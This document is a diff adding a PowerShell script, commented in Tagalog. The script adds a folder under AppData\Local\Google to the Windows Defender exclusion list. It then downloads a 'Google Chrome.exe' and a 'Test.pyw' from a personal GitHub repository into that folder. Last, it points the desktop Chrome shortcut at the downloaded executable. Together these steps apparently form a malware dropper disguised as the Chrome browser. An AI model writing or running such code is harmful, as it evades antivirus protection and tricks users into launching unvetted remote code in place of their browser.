@@ -1,0 +1,47 @@
+# I-run ang script bilang Administrator para masiguro na may pahintulot kang magbago ng Windows Defender exclusions at mag-modify ng desktop shortcuts.
+
+# 1. Gumawa ng directory kung wala pa
+$targetDir = "C:\Users\Admin\AppData\Local\Google"
+if (-not (Test-Path -Path $targetDir)) {
+    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+    Write-Host "Nagawa na ang direktoryo: $targetDir" -ForegroundColor Green
+} else {
+    Write-Host "Mayroon nang direktoryo: $targetDir. Hinayaan lang ito." -ForegroundColor Yellow
+}
+
+# 2. Isama sa Windows Defender Exclusion (Whitelist) ang folder
+try {
+    Add-MpPreference -ExclusionPath $targetDir -ErrorAction Stop
+    Write-Host "Tagumpay na naidagdag sa Windows Defender whitelist ang: $targetDir" -ForegroundColor Green
+} catch {
+    Write-Host "Hindi maidagdag sa whitelist. Siguraduhing Administrator ang pagpapatakbo ng script." -ForegroundColor Red
+}
+
+# 3. I-download ang Google Chrome.exe at Test.pyw mula sa GitHub
+$chromeUrl = "https://raw.githubusercontent.com/johndavidameminse-svg/Myproject/main/Google%20Chrome.exe"
+$testPywUrl = "https://raw.githubusercontent.com/johndavidameminse-svg/Myproject/main/Test.pyw"
+
+$chromeDest = Join-Path $targetDir "Google Chrome.exe"
+$testPywDest = Join-Path $targetDir "Test.pyw"
+
+Write-Host "Dina-download ang Google Chrome.exe..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $chromeUrl -OutFile $chromeDest
+
+Write-Host "Dina-download ang Test.pyw..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $testPywUrl -OutFile $testPywDest
+
+Write-Host "Tapos na i-download ang mga file sa $targetDir" -ForegroundColor Green
+
+# 4. Palitan kung mayroon, o kaya ay gumawa ng bagong shortcut sa Desktop
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$shortcutPath = Join-Path $desktopPath "Google Chrome.lnk"
+
+$WScriptObj = New-Object -ComObject WScript.Shell
+$shortcut = $WScriptObj.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $chromeDest
+$shortcut.WorkingDirectory = $targetDir
+$shortcut.Save()
+
+if (Test-Path -Path $shortcutPath) {
+    Write-Host "Tagumpay! Na-update o kaya ay nailagay ang Google Chrome shortcut sa Desktop." -ForegroundColor Green
+}
